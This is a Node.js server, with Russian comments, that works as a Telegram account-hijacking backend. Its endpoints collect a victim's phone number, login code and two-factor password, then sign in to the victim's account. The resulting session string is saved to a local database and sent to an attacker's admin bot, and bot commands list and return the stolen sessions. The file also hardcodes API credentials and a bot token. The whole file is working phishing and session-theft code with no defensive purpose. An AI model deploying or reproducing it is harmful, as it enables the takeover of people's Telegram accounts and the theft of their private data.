const express = require('express');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

// ⚠️ ТВОИ ДАННЫЕ ВПИСАНЫ ⚠️
const apiId = 36752126; 
const apiHash = "fdd421fda2805b7dbf3f1f53b793d512";
const BOT_TOKEN = "9096721962:AAHdJ-AhnKSHyyAv3ExEHVZC5pdE_do59Co";
const ADMIN_ID = 9068204920; 

if (!apiId || !apiHash || !BOT_TOKEN || !ADMIN_ID) {
    console.error("❌ ОШИБКА: Не заданы данные для Telegram!");
    process.exit(1);
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

const DB_FILE = './database.json';
if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, JSON.stringify({ sessions: [], stats: { total: 0 } }));
const getDB = () => JSON.parse(fs.readFileSync(DB_FILE));
const saveDB = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));

const activeClients = {};

app.post('/api/request-code', async (req, res) => {
    const { phone } = req.body;
    if (!phone) return res.status(400).json({ error: "Введите номер" });

    try {
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, phone);
        
        activeClients[phone] = { client, phoneCodeHash };
        res.json({ success: true });
    } catch (e) {
        console.error("Ошибка отправки кода:", e);
        res.status(500).json({ error: "Ошибка Telegram. Проверьте номер." });
    }
});

app.post('/api/verify-code', async (req, res) => {
    const { phone, code } = req.body;
    const session = activeClients[phone];
    if (!session) return res.status(400).json({ error: "Сессия истекла" });

    try {
        const { client, phoneCodeHash } = session;
        await client.invoke(new Api.auth.SignIn({ phoneNumber: phone, phoneCodeHash, phoneCode: code }));
        
        const sessionString = client.session.save();
        saveSession(phone, sessionString);
        delete activeClients[phone];
        
        res.json({ success: true });
    } catch (e) {
        if (e.errorMessage === 'SESSION_PASSWORD_NEEDED') return res.json({ requiresPassword: true });
        res.status(400).json({ error: "Неверный код" });
    }
});

app.post('/api/verify-password', async (req, res) => {
    const { phone, password } = req.body;
    const session = activeClients[phone];
    if (!session) return res.status(400).json({ error: "Сессия истекла" });

    try {
        const { client } = session;
        await client.signInWithPassword({ password }, async () => {});
        const sessionString = client.session.save();
        saveSession(phone, sessionString);
        delete activeClients[phone];
        
        res.json({ success: true });
    } catch (e) {
        res.status(400).json({ error: "Неверный пароль" });
    }
});

function saveSession(phone, sessionString) {
    const db = getDB();
    db.sessions.push({ phone, session: sessionString, date: new Date().toISOString() });
    db.stats.total += 1;
    saveDB(db);

    bot.sendMessage(ADMIN_ID, `🔥 **НОВЫЙ АККАУНТ!**\n\n📱 Номер: \`${phone}\`\n🔑 Сессия: \`${sessionString}\``, { parse_mode: 'Markdown' })
    .catch(err => console.error("Ошибка бота:", err));
}

// === АДМИН-БОТ ===
bot.onText(/\/start/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    bot.sendMessage(ADMIN_ID, "👋 Привет! Бот запущен.\n\n/status - Статистика\n/sessions - Список аккаунтов\n/get [номер] - Получить сессию");
});

bot.onText(/\/status/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    const db = getDB();
    bot.sendMessage(ADMIN_ID, `📊 **Статистика:**\nВсего: ${db.stats.total}\nВ базе: ${db.sessions.length}`);
});

bot.onText(/\/sessions/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    const db = getDB();
    if (db.sessions.length === 0) return bot.sendMessage(ADMIN_ID, "Пока пусто.");
    let text = "📁 **Аккаунты:**\n\n";
    db.sessions.forEach((s, i) => { text += `${i+1}. ${s.phone}\n`; });
    bot.sendMessage(ADMIN_ID, text);
});

bot.onText(/\/get (.+)/, (msg, match) => {
    if (msg.from.id !== ADMIN_ID) return;
    const phone = match[1].trim();
    const found = getDB().sessions.find(s => s.phone === phone);
    if (found) bot.sendMessage(ADMIN_ID, `📱 ${found.phone}\n🔑 \`${found.session}\``, { parse_mode: 'Markdown' });
    else bot.sendMessage(ADMIN_ID, "Номер не найден.");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
